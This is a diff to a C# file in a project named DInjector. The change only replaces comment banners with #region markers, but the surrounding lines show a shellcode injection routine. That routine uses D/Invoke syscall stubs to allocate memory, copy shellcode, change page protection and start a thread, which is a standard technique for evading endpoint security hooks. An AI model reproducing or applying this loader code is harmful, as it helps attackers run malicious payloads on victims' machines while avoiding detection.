@@ -48,7 +48,7 @@ namespace DInjector
         {
             var shellcode = shellcodeBytes;
 
-            // -- NtAllocateVirtualMemory ----------------------------------------
+            #region NtAllocateVirtualMemory
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -76,7 +76,9 @@ namespace DInjector
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
-            // -- NtProtectVirtualMemory -----------------------------------------
+            #endregion
+
+            #region NtProtectVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -99,7 +101,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
             }
 
-            // -- NtCreateThreadEx -----------------------------------------------
+            #endregion
+
+            #region NtCreateThreadEx
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
             NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
@@ -128,7 +132,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtCreateThreadEx: {ntstatus}");
             }
 
-            // -- NtWaitForSingleObject ------------------------------------------
+            #endregion
+
+            #region NtWaitForSingleObject
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
             NtWaitForSingleObject sysNtWaitForSingleObject = (NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObject));
@@ -146,6 +152,8 @@ namespace DInjector
             {
                 Console.WriteLine($"(Module) [-] NtWaitForSingleObject: {ntstatus}");
             }
+
+            #endregion
         }
     }
 }
